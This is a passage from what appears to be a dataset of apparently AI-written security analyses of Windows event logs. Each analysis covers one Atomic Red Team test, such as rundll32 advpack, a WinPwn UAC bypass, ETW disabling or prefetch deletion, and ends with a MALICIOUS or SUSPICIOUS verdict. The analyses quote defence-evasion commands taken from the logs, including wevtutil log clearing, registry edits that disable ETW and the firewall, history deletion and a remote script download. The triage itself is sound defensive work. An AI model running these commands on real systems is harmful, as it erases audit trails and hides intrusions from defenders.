    - The logs reference an Atomic Red Team test script (`T1218`). Atomic Red Team is a widely known red-teaming framework. This could point toward authorized testing scenarios or an adversary attempting to mimic such activities to disguise their actions.

### Assessment:
Based on the evidence examined in the system, application, security, and Sysmon logs, the behavior observed here does not fully align with typical system administration tasks. The key indicators of compromise include:
- The clearing of multiple logs (System, Windows PowerShell, Security logs) suggests attempts to cover tracks.
- The use of `powershell.exe` to execute a suspicious command leveraging `diskshadow.exe`.
- High-integrity level execution of `wevtutil.exe` to clear event logs.
- Context provided by potential testing scripts from Atomic Red Team.

### Recommendation:
- **Resolution**: **SUSPICIOUS**
- This activity should be further investigated. Immediate steps should be taken to verify whether these activities are authorized (e.g., red team exercises or internal testing). If unauthorized, initiate incident response protocols, including network containment for the involved systems, deeper forensic analysis, and a review of all impacted systems to identify further compromises.
- Consider implementing stricter monitoring and alerting for log clearing activities and the suspicious use of PowerShell and similar tools.
- Validate the legitimacy and security context of any testing frameworks or scripts such as those from Atomic Red Team used in your environment."
Rundll32 advpack.dll Execution,"Upon analyzing the provided logs, the following observations and findings can be made:

### Suspicious Behaviors Identified:

1. **Event Log Clearing**:
   - **System Logs**: The logs indicate that the ""admin_test"" user cleared the System, Windows PowerShell, and Security event logs as seen in the following entries:
     - **System:** EventID 104 - Logs cleared by ""admin_test"" (ProcessId: 7128)
     - **Security:** EventID 1102 - Logs cleared, which is a strong indicator of potential malicious activity. It is highly unusual for logs to be cleared without an explicit and legitimate purpose.
   
2. **Wevtutil Usage**:
   - Multiple instances of the `wevtutil` command are executed with the ""cl"" (clear-log) option targeting various event log channels including ""Application,"" ""System,"" and ""Security"". The use of `wevtutil` to clear log files is often associated with attackers attempting to cover their tracks:
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl Windows PowerShell`

3. **PowerShell Activity**:
   - The initiation of `powershell.exe` by the ""admin_test"" user is logged, but the absence of detailed command-line arguments doesn't provide enough context for further validation of its purpose without additional context:
     - Image: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`

4. **Atomic Red Team Simulation**:
   - The presence of the command referring to ""AtomicRedTeam"" indicates potential simulation or testing of adversarial tactics:
     - CommandLine: `""cmd.exe"" /c rundll32.exe advpack.dll,LaunchINFSection ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.011\\src\\T1218.011.inf"",DefaultInstall_SingleUser,1,`
   - This may suggest this is part of a test scenario or an intentional simulation of a tactic.

### Malicious Indicators:

The combination of log clearing, particularly of the Security logs, and the use of wevtutil for this purpose raises a red flag for potentially malicious activity. This behavior is highly indicative of an attempt to evade detection by covering tracks, a common tactic used by attackers post-compromise. 

### Assessment and Resolution:

Based on the observations above, the activity outlined within these logs is classified as **MALICIOUS**.

   - The command line utility `wevtutil.exe` appears frequently, with the user `SERVER002\admin_test` executing several commands to clear the event logs for Application, System, and Security channels (`cl Application`, `cl System`, `cl Security`). This activity is highly suspicious as it indicates an attempt to cover tracks by clearing logs, which is a common malicious tactic after unauthorized access or data exfiltration attempts.

2. **Use of `bcdedit` Command:**
   - The command `cmd.exe /c bcdedit /set safeboot network` is executed. This command modifies Boot Configuration Data (BCD) to set the system to boot in Safe Mode with Networking, which may disrupt system functions and suggests preparation for further configuration changes, potentially malicious.

3. **Time Manipulation:**
   - The logs indicate time changes (`EventID 4616`), as seen by entries where `svchost.exe` altered the system clock. Time manipulation can be part of attempts to disrupt log timelines, making it difficult to correlate events during forensics. It's noteworthy that these changes precede the log clearance events.

4. **Use of `whoami.exe` and `hostname.exe`:**
   - These commands are generally benign but, in the context of other suspicious activity, may indicate reconnaissance by the attacker to understand the user context and system environment.

5. **Logon Activity:**
   - All activities are linked to the `SERVER002\admin_test` account with a high integrity level, indicating potential unauthorized access or compromised credentials.

### Indicators of Malicious Activity:
- **Log Cleansing:** The clearing of essential logs such as Security, System, and PowerShell logs (EventID 104 in System log and EventID 1102 in Security log) by an admin account under suspicious circumstances signifies malicious intent.
- **Privilege Use:** Activities requiring administrative privileges were executed, hinting at potential attempts to escalate privileges if unauthorized access was initially attained.

### Conclusion:
Given the described findings, the behavior observed in the logs aligns with what one could expect from malicious activity, mostly post-exploitation cleanup and system tampering. High integrity level access was used to alter system settings, clear logs, and modify boot configurations. 

### Resolution:
Based on the logs and activities observed:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the involved system to prevent further potential lateral movement or data exfiltration.

InstallUtil Uninstall method call - -U variant,"### Detailed Analysis

**1. Suspicious Behavior:**
Several pieces of information from the logs stand out as indicative of potentially malicious behavior:

- **PowerShell Execution**: The PowerShell scripts in use are using a known technique associated with lateral movement and defense evasion tactics. The use of `InstallUtil` with the PowerShell script `InstallUtilTestHarness.ps1` is part of the Atomic Red Team's technique catalog for T1218.004, which is often used for executing codes under the guise of traditional operations, raising suspicion.

- **Log Clearing Events**: The logs show multiple instances of event log clearing operations executed by the user `admin_test`. These events occur across various logs like System, Security, and PowerShell `EventID=104` and `1102`, pointing towards potential log tampering meant to cover up actions.

- **Sysmon Logs**: The presence of `wevtutil` processes with command lines indicating log clearing (`""cl""` stands for log clearing) from the Application, System, and Windows PowerShell channels is noted. This complements the explicit log clearing events from the other logs.

- **Process Execution**: The execution of processes from temporary directories, specifically PowerShell running a script with a path in `TEMP` (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.004\\src\\InstallUtilTestHarness.ps1`), which is not typical behavior for most administrative tasks, strengthens the case for cautious investigation.

**2. Indicators of Malicious Activity or Compromise:**
- **Log Manipulation**: There is clear evidence that logs have been cleared purposefully by `wevtutil.exe`, which is commonly used for this purpose. This act is highly indicative of an attacker attempting to hide their traces.
- **Use of Admin Accounts**: The usage of a normal admin account (`SERVER002\\admin_test`) for carrying out tasks closely related to privilege escalation or maintaining persistence indicates a potential insider threat or compromised account.
- **Atomic Red Team Usage**: Being a toolkit often used in penetration testing and offensive security practices, its presence in this context suggests testing or unauthorized use.

### Assessment
Considering the analysis above, the logs present a strong case for suspicious activities due to the combination of potentially evasive PowerShell scripts, deliberate log clearing, and the evident use of Atomic Red Team techniques. These converge to imply testing or a breach attempt.

### Resolution: SUSPICIOUS
Given the indicators above, the activity is marked as **SUSPICIOUS**. More investigation is required to establish intent and identify potential backdoor or escalated privileges and any connections to external hosts or unauthorized network access.

### Guidance on How to Proceed
1. **Immediate Account Audit**: Verify the actions of the user `admin_test` to ensure legitimacy and investigate any anomalous behavior or authentications.
   
2. **Close Monitoring**: Implement heightened monitoring of the system and network activity around this account and host to detect further suspicious actions promptly.

3. **Review and Compare**: Cross-reference any similar activities across the network to detect potential coordinated attempts or similar patterns.

4. **Forensic Image Analysis**: Consider taking and analyzing forensic images of the system to search for persistence mechanisms or uploaded tools/scripts.

WinPwn - UAC Bypass ccmstp technique,"### Detailed Analysis:

#### **Indicators of Malicious Activity:**

1. **PowerShell Execution with Suspicious Commands:**
   - In the Windows PowerShell log events (Event IDs: 1043-1049), there is a PowerShell command that attempts to download and execute a script from a GitHub repository ('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1'). This is a known repository for penetration testing and bypassing security controls, which includes a technique such as `UACBypass`, indicating an attempt to bypass User Account Control by potentially launching processes with elevated privileges without proper authorization. This is highly suspicious and aligns with tactics used for privilege escalation.

2. **Event Log Manipulation:**
   - The System log event with Event ID 104 indicates the clearing of the Windows event logs by user 'admin_test'. Clearing event logs is often a tactic used to cover tracks after performing malicious actions, which is a strong indicator of compromise.

3. **Sysmon Log Entries:**
   - Multiple instances of `wevtutil.exe` clearing logs (Sysmon Event IDs: 17949, 17953, 17957, 17961, 17965) correlate with the clearing of event logs as seen in the System and Security logs. The parent process for these activities is wsmprovhost.exe, which should be scrutinized. The consistent clearing of logs suggests an automated or scripted approach to obfuscate actions.

4. **Anomalous Process Executions:**
   - The execution of `powershell.exe` with potentially harmful scripts (as seen in both the Windows PowerShell logs and corresponding Sysmon events) is a critical concern. The PowerShell command-line details reflect intentions to execute unauthorized scripts and bypass UAC prompts.

#### **Assessment of the Situation:**

- **Malicious Activity Identified:** The logs indicate clear malicious activity primarily involving unauthorized scripts executed via PowerShell, attempts to bypass system security controls (UAC), and systematic clearing of several Windows event logs to hide these actions.
- **Threats and Risks:** The presence of scripts designed to perform privilege escalation and log tampering suggests a serious security breach. If these actions were successful, the integrity, confidentiality, and availability of the system and potentially the entire network could be at risk.

#### **Guidance on How to Proceed:**

1. **Immediate Containment and Eradication:**
   - Disconnect the affected machine (Server002) from the network to prevent further lateral movement of malicious actors.
   - Investigate and remove any scheduled tasks, services, or persistence mechanisms installed by the unauthorized scripts.

2. **Forensic Analysis:**
   - Collect forensic images of the impacted system for offline investigation and deeper analysis.
   - Inspect for any further persistence mechanisms or anomalies that may not be directly visible through logs.

3. **Review and Strengthen Security Configurations:**
   - Implement strict execution policies and logging for PowerShell usage.
   - Ensure adequate monitoring solutions (EDR/XDR) are in place and properly configured to detect suspicious PowerShell activities.

4. **Detection and Monitoring:**
   - Increase monitoring for similar activities across other systems, particularly focusing on PowerShell activity and event log manipulations.

5. **Security Awareness:**
   - Conduct awareness sessions to inform employees about phishing attacks or any initial access vectors potentially used in this incident.

6. **Conduct a Full Security Audit:**
   - Review and harden all security configurations, policies, and procedures, especially those related to administrative privileges and security logging.

### Conclusion:
- **Resolution: MALICIOUS** - The logs contain clear indicators of malicious activity, including the execution of known harmful scripts and event log tampering, indicative of an attempt to compromise and escalate privileges within the system. Immediate action is needed to contain the threat and mitigate any potential impacts."
Disable .NET Event Tracing for Windows Via Registry (powershell),"### Detailed Analysis

Upon reviewing the provided log entries across different logs (PowerShell, System, Sysmon, Security, and Application), several observations and potential indicators of malicious activity have been identified:

#### **1. PowerShell Logs:**
- The PowerShell log entries indicate a script execution that modifies the Windows registry settings related to .NET Framework ETW (Event Tracing for Windows) features. Specifically, the command being executed is:
  ```powershell
  powershell.exe & {New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force}
  ```
  Modifying registry settings, especially related to event tracing, can be an attempt to disable logging or obfuscate activity, which is a common tactic used by threat actors to evade detection.

#### **2. System Logs:**
- There are logs indicating that the event logs were cleared:
  - System log cleared by user `admin_test`.
  - Windows PowerShell log cleared by the same user.
  - This activity is highly suspicious as clearing logs can be an indicator of someone trying to cover their tracks after performing malicious activities. This is compounded by the credentials used, which are suspiciously named and likely not a default admin name.

#### **3. Sysmon Logs:**
- The execution of `wevtutil.exe` with commands to clear logs (`cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`) was observed. This utility is typically used to manage event logs, and its usage to clear logs is consistent with potentially malicious actions.
- Multiple command-line executions of key utilities in sequence (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and PowerShell) by the user `SERVER002\\admin_test` suggest potential enumeration or reconnaissance activity.

#### **4. Security Logs:**
- The security log shows a log clearance, which aligns with the system log events and further indicates potentially malicious intent to erase audit trails.

#### **5. Anomalous Time Change:**
- A slight time manipulation is observed in the Kernel-General and Security logs:
  - The time was set back temporarily, possibly to manipulate timestamps of logs. This can be part of an evasion tactic.
  
### Assessment and Resolution

Based on the analysis above, the following assessment can be made:
- **Indicators of Malicious Activity:**
  - Execution of a script to modify registry for potentially disabling ETW.
  - Clearing of multiple event logs using an administrative account.
  - Usage of `wevtutil.exe` for log clearance.
  - Unusual and potentially intentional time-changing actions that could be used to obscure log events.

Given that multiple signs point to attempts to manipulate system settings, perform reconnaissance, and cover tracks by clearing logs, the activity in these logs suggests malicious behavior likely indicative of a compromise or an ongoing attack.

### Final Resolution: **MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the affected host (Server002) from the network to prevent further lateral movement and data exfiltration.
   - Conduct a thorough forensic investigation to determine the extent of the compromise and identify any additional indicators of compromise (IOCs).

2. **Remediation:**
   - Reset credentials for `admin_test` and investigate how this account was compromised.
   - Restore affected systems and logs from backups, if necessary.
   - Review and enhance PowerShell and system logging configurations to ensure monitoring is comprehensive and cannot be easily disabled or manipulated.

3. **Preventive Measures:**
   - Implement more stringent access controls and monitoring of administrative actions.
   - Employ robust anomaly detection mechanisms to flag and respond to similar activities in the future.
   - Conduct a security audit of other systems to ensure there are no other compromised accounts or unauthorized access points.

These actions will help contain and mitigate the current threat while bolstering defenses against future malicious attempts."
LOLBAS Msedge to Spawn Process,"After analyzing the provided Windows event logs, I have identified several indicators of potentially malicious activity:

1. **Security Log Clearing:**
   - Multiple log entries in the ""System"" and ""Security"" logs indicate that the logs were cleared by the user ""SERVER002\admin_test"". Specifically, the ""System"" log event (Event ID 104) and ""Security"" log event (Event ID 1102) were cleared.
   - Clearing of logs is an action often used by malicious actors to cover their tracks after compromising a system.

2. **Suspicious PowerShell Activity:**
   - The PowerShell script executed includes a PowerShell command that appears to be used to launch a process in a suspicious manner. The script attempts to find the Microsoft Edge executable and uses it to execute a command that launches ""calc.exe"" using the `--disable-gpu-sandbox` option, which could be used to bypass security constraints.
   - The command also force terminates processes such as `msedge.exe`, `calc.exe`, and `win32calc.exe` after execution. This behavior is consistent with attempts to perform arbitrary code execution using legitimate processes.

3. **Anomalous Process Executions:**
   - The Sysmon log data reveals multiple instances of the Windows Calculator (`calc.exe`) being launched in quick succession through a command originating from PowerShell, demonstrating a pattern indicating the misuse of Edge's launching mechanism.
   - This behavior is clearly seen in the `CommandLine` field of the PowerShell and Sysmon events, confirming that this method was used to launch unauthorized processes.

Given these findings, the assessment of the situation points to a compromise. The combination of log clearance and unconventional use of legitimate processes to execute suspicious activity are strong indicators of malicious behavior.

**Conclusion:**
- **Resolution: MALICIOUS**

**Recommendations for Immediate Action:**
1. Isolate the affected machine (Server002) from the network to prevent further unauthorized access or data exfiltration.
2. Conduct a thorough forensic investigation to determine the scope of the breach and the potential impact on other systems.
3. Review and enhance security measures, including PowerShell script auditing and alerting on log clearance activities.
4. Reset credentials for the compromised account ""admin_test"" and review account access permissions.
5. Consider involving incident response professionals to assist with further analysis and remediation efforts to ensure the integrity of the network is restored."
Modify UsePartialEncryptionKey Registry entry,"Upon thorough analysis of the provided Windows event logs, several key observations and issues are evident:

1. **Repetition of wevtutil.exe Usage**: The logs show multiple entries where the `wevtutil.exe` command-line utility is executed with the command line argument to clear various event logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, and `Windows PowerShell`. The command was executed under the context of `SERVER002\admin_test` with high integrity level, which suggests administrative privileges.

2. **Clearing of Event Logs**: Direct evidence of log clearance is present. For instance, EventID 104 in the System log specifies that the `System` log was cleared. Similarly, EventID 1102 in the Security log indicates that the security log was cleared. Clearing event logs is a common tactic used by malicious actors to cover tracks and hide evidence of unauthorized or malicious activities.

3. **Registry Modification via cmd.exe**: There is an execution of `cmd.exe` command with arguments to alter the registry key `HKLM\SOFTWARE\Policies\Microsoft\FVE`, potentially changing encryption settings. Such unsolicited changes to registry keys, especially those pertaining to encryption policies, can indicate an attempt to weaken system security.

4. **Time Modification**: Events from the System and Security logs indicate a time change operation (EventID 4616), where the system time was adjusted. This time change can potentially be used to backdate activities to align log timestamps with expected behavior or hide malicious actions.

5. **Normal Unrelated System Activity**: Several entries related to Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`) seem to indicate regular application update activities and do not inherently suggest malicious activity.

### **Assessment**

- **Suspicious Activities**: The frequent use of `wevtutil.exe` to clear logs and the registry modification command are suspicious. They are symptoms of behavior often associated with system compromise or a cover-up of unauthorized access.
  
- **Log Clearance**: Direct evidence of logs being cleared is troubling and typically signifies an attempt to obscure illegal actions on the system.
  
- **Registry Manipulation and Time Change**: Both the registry changes and system time changes can be part of a broader effort to manipulate system settings to bypass security or audit mechanisms.

### **Resolution: MALICIOUS**

The activities logged, especially the systematic clearing of event logs, coupled with the suspicious registry modifications and time changes, provide clear indicators of malicious intent and actions on the system. 

### **Guidance on How to Proceed**

1. **Immediate Response**: Isolate the affected machine from the network to prevent further potential spread or damage.
   
2. **Forensic Analysis**: Conduct a comprehensive forensic investigation on the system to identify the method of compromise and scope of the incident.

3. **Audit and Review**: Examine access logs, user credentials, and recent administrative changes for anomalies.

4. **Restoration and Monitoring**: Restore the system with verified clean backups and implement enhanced monitoring for unusual system activities.

5. **Patch and Update Security Measures**: Ensure all systems are patched, and security measures such as firewalls, EDR, and antivirus are fully updated and correctly configured.

6. **User Awareness and Training**: Educate users, particularly those with administrative privileges, about recognizing phishing attempts and the importance of secure behavior online. 

It's crucial to follow a structured incident response plan to mitigate damages and learn from the event to strengthen future defenses."
Requires the BitLocker PIN for Pre-boot authentication,"### Analysis of Logs

Upon reviewing the provided event logs, several suspicious activities stand out:

1. **Clearing of Event Logs:**
   - The logs contain multiple instances where event logs (System, Windows PowerShell, and Security logs) were cleared, as indicated by Event ID 104 in the System log and Event ID 1102 in the Security log. 
   - Clearing of event logs is generally performed to hide tracks of potentially malicious activities and is a significant indicator of potential compromise.

2. **Use of `wevtutil.exe`:**
   - The presence of `wevtutil.exe` being executed multiple times to clear various logs, as seen in the Sysmon logs (EventIDs: 17976, 17980, etc.), further corroborates the attempt to hide activities. The command lines used evidently show intentions to clear logs.
   - The command `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational` shows log clearing for Sysmon, a critical source of security data.

3. **Registry Modification Attempts:**
   - Events 18004, 18006 indicate the use of `cmd.exe` and `reg.exe` to modify registry keys. The command adding `UseAdvancedStartup` to `HKLM\SOFTWARE\Policies\Microsoft\FVE` is particularly concerning as it may alter system boot policies.

4. **Pattern of Elevated Privileges & Execution:**
   - Most commands are executed under a high integrity level with `SERVER002\admin_test` user, implying administrative privileges were used during these activities. Unauthorized or unexplained access and modifications using high privileges should be investigated.

5. **Process Chain:**
   - There is a visible process chain from `wsmprovhost.exe` leading to the execution of these suspicious activities. Repeated chains involving execution of host utilities (`whoami`, `hostname`, `cmd`, `reg`) suggest reconnaissance and possible privilege escalation attempts.

### Assessment

The combination of log clearing, registry modifications, and execution of administrative utilities is a strong indicator of malicious activity. This pattern is consistent with attempts at post-exploitation cleanup and system manipulation to either establish persistence or create a backdoor.

1. The clearing of logs, especially Security logs, is typically used by attackers to cover their tracks, making this a strong red flag.
2. The execution of registry modifications without clear justification can suggest attempts to change settings for persistence or to prepare for further malicious actions.

### Resolution: MALICIOUS

Given the analysis, the activities logged are consistent with known tactics used by attackers for obfuscation and system manipulation. As such, the logs indicate **MALICIOUS** activity. Immediate action is recommended to isolate the affected system, conduct a full incident response, and determine the extent of the compromise.

### Guidance on How to Proceed

1. **Isolate the System:**
   - Disconnect the affected host (Server002) from the network to prevent further spread and interaction with potentially compromised components.

2. **Incident Response:**
   - Conduct a thorough forensic investigation to capture volatile data for evidence.
   - Examine other logs not cleared or available from network appliances, SIEM, etc., for additional context or indicators of compromise.

3. **Review and Harden Security Configurations:**
   - Review user accounts and their privileges, especially `admin_test`, to ensure they're correctly set and not compromised further.
   - Investigate all recent changes to group policies, scripts, installed services, and scheduled tasks.

4. **Restore System and Monitor:**
   - Restore the system using a clean, unaffected backup if available.
   - Protect and monitor for unusual behavior with enhanced logging and alerts.

5. **Communication and Reporting:**
   - Follow internal protocols to report the incident to the relevant stakeholders and, if needed, to law enforcement or relevant authorities.
   - Document all findings, actions taken, and remediation steps for future learning.

The above actions will help ensure the immediate threat is mitigated and aid in preventing future incidents."
Disable Microsoft Defender Firewall via Registry,"Upon analyzing the provided log entries, several indicators of suspicious and potentially malicious activity can be identified. Here is a breakdown of the key findings:

1. **Log File Clearing and Time Manipulation**: 
   - Security Event Log 1102 indicates the security log was cleared by the user `admin_test`. Log clearing is a red flag as it might indicate an attempt to cover tracks.
   - Time-related events (Event 4616) show manipulation or inconsistency in system time, which can be indicative of tampering to disrupt log accuracy or sequence.

2. **Elevated Privilege Use**:
   - Event 4672 shows that the user `admin_test` was granted a list of powerful privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges can be leveraged for unauthorized access or control over the system.

3. **Unusual Process Activity**:
   - Sysmon Event 1 shows multiple execution of `wevtutil.exe` with the `cl` (clear) command across various log channels, including Security, Application, and System. This is suspicious as it indicates deliberate attempts to clear logs.
   - There is also the execution of `cmd.exe` with parameters to disable the firewall (`reg add ... /d 0 /f`), which is potentially harmful as it affects system security settings.

4. **Lateral Movement Indicators**:
   - Logons using NTLM over the network (Event 4624 with LogonType 3) with the user `admin_test` from a suspicious workstation `DESKTOP-3HL5B2P` using IP `192.168.0.102` suggests potential lateral movement or remote access attempts.

5. **System and Application Log Clearing**:
   - System log Event 104 also indicates clearing of logs by `admin_test`, reinforcing the behavioral pattern of attempting to cover tracks.

Assessment: The combination of log file clearing, time manipulation, use of elevated privileges, and disabling security features indicates a high likelihood of malicious activity.

Resolution: **MALICIOUS**

Guidance on How to Proceed:
- Immediate containment actions should be taken to isolate the affected system to prevent further compromise.
- Conduct a full forensic investigation to understand the scope of the breach and identify compromised data or systems.
- Review and tighten security controls, including monitoring privileged accounts and implementing network segmentation.
- Reset credentials for affected accounts and ensure logging and monitoring are reinstated and secured against tampering."
Delete a single file - Windows cmd,"Upon reviewing the supplied log entries, several indicators of potentially malicious activities are evident. Let's dive into the analysis step-by-step:

### Key Observations

1. **Suspicious Command Executions**:
   - Multiple instances of `cmd.exe` are invoked with unusual command line arguments focused on creating, checking, and deleting a file named `deleteme_T1551.004` in the Temp directory using command sequences typically not associated with standard user actions. Such actions could indicate the presence of a script or batch file in testing or signaling a backdoor operation.
   - The use of `wevtutil.exe` to clear event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl Security`) indicates an attempt to cover tracks, which is a hallmark of malicious activity.
  
2. **Event Log Clearing**:
   - The presence of event ID 1102 in the Security logs and several event ID 104 in the System/Event logs indicates the security and system logs have been cleared. Log clearing is commonly performed by attackers to erase evidence of their intrusion.

3. **Account Usage**:
   - Most actions were executed under the account `SERVER002\admin_test`, which shows an advanced level of privileges (high integrity). The actions seen in the logs are consistent with privilege misuse or hijacking.

4. **Network and System Services**:
   - Time discrepancies or changes spotted with event ID 4616 and performed by the process `svchost.exe` suggest potential time-stomping activities; where timestamps are manipulated to obfuscate the operation timeline.

5. **Use of Built-In Tools**:
   - The use of system utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are typical reconnaissance and system interaction steps an attacker might take to ascertain environment details and execute further stages of an attack.

### Assessment of the Situation

- **Threat Level**: High. The combined elements of executing shell commands with purposefully created test files, the clearing of event logs indicative of track-covering attempts, and the suspicious sequence of system utility usage all point to a likely compromise.

- **Risks Identified**:
  - **Data Exfiltration Potential**: Given the privilege level and capabilities demonstrated, an attacker might have gathered sensitive information.
  - **Persistence and Further Exploits**: The attacker, possibly having control over an admin level account, might establish persistence for future access.
  
- **Indicators of Compromise (IOCs)**:
  - Use of `wevtutil.exe` for clearing logs.
  - The file `deleteme_T1551.004` alongside traces of command operations around it.
  
### Recommended Next Steps

1. **Immediate Containment**:
   - Temporarily disable the compromising account `admin_test` on `Server002`.
   - Isolate the system from the network to prevent data exfiltration or further communication with potential external control nodes.

2. **Detailed Forensic Analysis**:
   - Conduct a comprehensive review of installed software, scheduled tasks, and system services for backdoors.
   - Review firewall, network, and other server logs for unusual outbound connections or data transfers at around the alert times.

3. **Audit and Remediation**:
   - Strengthen account policy by enforcing dynamic and strong passwords, coupled with two-factor authentication.
   - Apply tighter monitoring on the use of PowerShell and Command Prompt utilities, including advanced logging to detect unusual patterns quickly.

**Resolution**: **MALICIOUS**  
The coordinated series of actions with system utilities, file manipulations, and subsequent log clearing conclusively point to this being a deliberate and malicious activity, fitting well into techniques employed by threat actors. Immediate response and investigation are warranted to mitigate and fully understand the extent of the compromise."
Delete Prefetch File,"Upon reviewing the provided Windows event logs, there are several indicators of suspicious and potentially malicious activity. Let's break down the key points:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity:**
   - Several PowerShell commands were executed with a command line indicative of an attempt to remove the prefetch files: 
     ```
     powershell.exe & {Remove-Item -Path (Join-Path ""\\$Env:SystemRoot\\prefetch\\"" (Get-ChildItem -Path ""\\$Env:SystemRoot\\prefetch\\*.pf"" -Name)[0])}
     ```
   - This type of command can be associated with malicious activity, particularly in attempts to clean traces or logs from the system.
   
2. **Clearing Event Logs:**
   - Multiple event logs (System, Security, Windows PowerShell) were cleared using the `wevtutil` command:
     ```
     ""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational
     ```
   - Clearing event logs is a well-known technique used by attackers to cover their tracks and hide malicious activities.

3. **Security Log Activity:**
   - Event ID `1102`: The event log was cleared by the user `admin_test`. This is a clear sign of potentially malicious activity if not performed during legitimate maintenance.
   - Multiple `4616` events indicate changes in system time, which can be suspicious if not correlated with legitimate system updates or maintenance activities.
   - There are numerous `4624` and `4672` events highlighting logons and special privileges that might warrant further scrutiny to ensure these actions were legitimate and expected.

### Indicators of Malicious Activity or Compromise:
- The use of PowerShell to manipulate system files like those in `prefetch` and clearing of logs indicates potentially malicious intent.
- The execution of commands to clear system and security event logs further solidifies the suspicion of an attempt to mask activities.
- The processes executed, such as `wevtutil.exe`, `powershell.exe` with the aforementioned command lines, are clear signs that activity might not be benign.

### Assessment and Recommendation:
- **Assessment:** Based on the evidence of attempted deletion of system artifacts using PowerShell and the clearing of various logs, these activities align with known attacker methodologies for maintaining persistence and obfuscating their presence within a system.

- **Recommendation:**
  - Immediately initiate a deeper forensic analysis of the host to uncover the scope of compromise.
  - Check for additional signs of malicious behavior, such as any unauthorized access, data exportation, or further system changes.
  - Reset passwords for `admin_test` and other critical accounts.
  - Ensure the system is isolated from the network until a thorough investigation is complete.

### Resolution:
- **Resolution:** MALICIOUS - The logs contain activity that strongly indicates malicious intent aimed at deception and system manipulation.

This necessitates immediate response actions to contain and mitigate potential threats. Further investigation and possible escalation should be considered based on findings from a deeper forensic analysis."
Clear Powershell History by Deleting History File,"### Detailed Analysis

Upon reviewing the provided Windows event logs, a detailed examination reveals several indicators that suggest suspicious and potentially malicious activities on the host system, particularly originating from the user `SERVER002\admin_test`.

#### Suspicious Activities Identified:

1. **Event Log Clearing:** 
   - Multiple log-clearing events are noted across different log channels - System, Security, and Windows PowerShell.
     - Event ID 104: Logs were cleared by `admin_test`.
     - Event ID 1102: Security log cleared by `admin_test`.
   - The clearing of logs, especially security logs, is a well-known tactic used by malicious actors to cover tracks.

2. **Unusual PowerShell Command:**
   - PowerShell executed a command to remove the history save path of `PSReadline`, which could be an attempt to remove traces of command history: 
     - Command: `powershell.exe & {Remove-Item (Get-PSReadlineOption).HistorySavePath}`
   - Such commands are often associated with script-based malicious activities trying to obfuscate their presence.

3. **Eventing Command Line Utility (wevtutil.exe):**
   - Execution of `wevtutil.exe` was observed multiple times.
   - `wevtutil.exe` was used with the command-line argument `cl` (clear), indicating a concerted effort to clear various event logs.
   - The repeated use of this utility to clear logs further implicates malicious intent.

4. **Processes of Interest:**
   - The execution of `whoami.exe` and `hostname.exe` may indicate reconnaissance activities often performed by malicious software to gather information about the system.
   - The execution of these utilities, while not inherently malicious, in conjunction with the log-clearing activity suggests possible script automation or manual probing by an attacker.

5. **High Integrity Level Operations:**
   - The processes are executed with high integrity levels, which may indicate an attempt to perform privileged actions on the host system.

#### Assessment:

Based on the behaviors observed in the event logs, there are clear indicators of potentially malicious activities:

- The systematic clearing of logs across multiple log channels by the user `admin_test`.
- The use of PowerShell for potentially obfuscating command history.
- The use of system utilities to gather system information possibly for reconnaissance.

These activities, particularly the combination of log clearing and scripting via PowerShell, strongly suggest an attempt to hide traces on the system after potentially performing unauthorized or illicit activities.

### Resolution: MALICIOUS

Given the evidence of logs being cleared deliberately, use of `PowerShell` to remove command history, and other suspicious actions, I can confidently categorize these activities as **MALICIOUS**.

### Recommended Actions:

1. **Immediate Containment:**
   - Isolate the affected host (Server002) from the network to prevent further spread or exfiltration of data.

2. **Root Cause Analysis:**
   - Conduct a thorough forensic analysis on the affected system to determine how access was gained and identify any persistence mechanisms installed by the attacker.

3. **Credential Audit:**
   - Audit and reset credentials for the ‘admin_test’ user, and potentially all administrator accounts on the system, to ensure no unauthorized access continues.

4. **Review and Update Security Policies:**
   - Ensure audit logs are regularly reviewed and have not been tampered with to maintain their integrity.
   - Implement tighter controls and monitoring on the use of administrative tools and scripting languages like PowerShell.

5. **Strengthen Security Controls:**
   - Deploy endpoint detection and response (EDR) solutions capable of detecting similar activities in the future.
   - Educate users on secure practices and the importance of log monitoring.

By following these steps, the organization can aim to mitigate the risk posed by this incident and prevent future occurrences of similar activities."
WMIC bypass using local XSL file,"Upon analyzing the provided Windows event logs, several indicators suggest that suspicious or potentially malicious activities have occurred on the host ""Server002"". Here is a detailed breakdown of the findings:

### Key Observations:

1. **Log Clearing Events:**
   - **Security Log Cleared** (`EventID 1102`): The security log was cleared by a user with the name `admin_test`. This is highly suspicious as log clearing is often an attempt to cover tracks after malicious activity.
   - **System and Windows PowerShell Logs Cleared** (`EventID 104`): The system and Windows PowerShell logs were cleared around the same timestamp by the same user `admin_test`. Log clearing of multiple logs by an admin account around the same time strongly indicates an effort to obfuscate actions on the system.

2. **Execution of `wevtutil.exe`:**
